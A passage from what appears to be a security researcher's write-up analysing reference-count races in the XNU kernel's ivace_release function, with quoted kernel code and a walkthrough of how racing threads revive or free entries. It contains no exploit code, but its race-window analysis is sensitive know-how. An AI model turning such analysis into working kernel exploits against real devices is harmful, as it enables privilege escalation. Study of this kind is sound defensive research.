class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* non-zero reference on the value.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_releasing &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;Let&amp;#39;s take the first case:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the value of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;before the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s lock was dropped and re-acquired. If those are different, it indicates that a race did occur and another thread (or threads) revived this &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;(since even though the refs has gone to zero it hasn&amp;#39;t yet been removed by this thread from the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s hash table, and even though it&amp;#39;s been marked as being released by setting &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_releasing&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;TRUE&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;, that doesn&amp;#39;t prevent another reference being handed out on a racing thread.)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;There are then two distinct sub-cases:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;1) &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;(ivace-&amp;gt;ivace_made != made)&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="BGLtzooHlW-c19 BGLtzooHlW-c11"&gt;(KERN_SUCCESS == kr)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;We can now parse the meaning of this: this &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;was revived but that occurred after the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;was freed on this thread. The racing thread then allocated a *new* value which happened to be exactly the same as the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;this &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;has, hence the other thread getting a reference on this &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;before this thread was able to remove it from the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s hash table. Note that for the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;case the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a pointer (making this particular case even more unlikely, but not impossible) but it isn&amp;#39;t going to always be the case that the value is a pointer; at the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;nbsp;layer the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;is actually a 64-bit &lt;/span&gt;&lt;span class="BGLtzooHlW-c14"&gt;handle&lt;/span&gt;&lt;span&gt;. The &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;attr chooses to store a pointer there.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;So what&amp;#39;s happened in this case is that another thread has looked up an &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;for a new &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;which happens to &lt;/span&gt;&lt;span class="BGLtzooHlW-c14"&gt;collide&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;(due to having a matching pointer, but potentially different buffer contents) with the value that this thread had. I don&amp;#39;t think this actually has security implications; but it does take a while to get your head around.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;If this is the case then we&amp;#39;ve ended up with a pointer to a revived ivace which now, despite having a matching &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span&gt;, is never-the-less semantically different from the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;we had when this thread entered this function. The connection between our thread&amp;#39;s idea of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;and the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;has been severed; and we need to remove our thread&amp;#39;s contribution to that; hence:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.1577686d6e27cb6539edf4c668c25d37d0e6652c"&gt;&lt;/a&gt;&lt;a id="t.50"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_made &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_made &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;2) &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;(ivace-&amp;gt;ivace_made != made)&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;(0 == ivace-&amp;gt;ivace_refs)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;In this case another thread (or threads) has raced, revived this ivace and then deallocated all their references. Since this thread set &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_releasing&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;TRUE&lt;/span&gt;&lt;span&gt;&amp;nbsp;the racing thread, after decrementing &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_refs&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;back to zero encountered this:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.26d470c1ed36965b7017da35a088eb61bd6b63c5"&gt;&lt;/a&gt;&lt;a id="t.51"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_releasing&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;and returned early from &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_release&lt;/span&gt;&lt;span&gt;, despite having dropped &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_refs&lt;/span&gt;&lt;span&gt;&amp;nbsp;to zero, and it&amp;#39;s now this thread&amp;#39;s responsibility to continue freeing this &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.695f8a6ea5856759df1540506f4e25734c86a633"&gt;&lt;/a&gt;&lt;a id="t.52"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_refs&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;goto&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;redrive&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;You can see the location of the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;redrive&lt;/span&gt;&lt;span&gt;&amp;nbsp;label in the earlier snippets; it captures a new value from &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;before calling out to the attr manager again to try to free the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;If we don&amp;#39;t &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;goto redrive&lt;/span&gt;&lt;span&gt;&amp;nbsp;then this &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;has been revived and is still alive, therefore all that needs to be done is set &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_releasing&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;FALSE&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;and return.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;The conditions under which the other branch is taken is nicely documented in a comment. This is the case when &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is equal to &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;made&lt;/span&gt;&lt;span&gt;, yet &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivam_release_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;didn&amp;#39;t return success (so the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;wasn&amp;#39;t freed.)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.5eb97c3d310b04e72ad54169750ec70dff549ca6"&gt;&lt;/a&gt;&lt;a id="t.53"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* If the manager returned FAILURE, someone took a&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* reference on the value but have not updated the ivace,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* release the lock and return since thread who got&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* the new reference will update the ivace and will have&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* non-zero reference on the value.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;In this case, the code again just sets &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_releasing&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;FALSE&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;and continues.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Put another way, this comment explaining is exactly what happens when the racing thread was exactly in the region marked &lt;/span&gt;&lt;span class="BGLtzooHlW-c23"&gt;WINDOW&lt;/span&gt;&lt;span&gt;&amp;nbsp;up above, which is after that thread had incremented &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the same &lt;/span&gt;&lt;span 